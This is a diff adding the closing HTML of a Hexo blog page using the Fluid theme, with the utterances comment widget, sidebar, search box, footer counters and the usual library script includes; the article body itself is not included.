+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
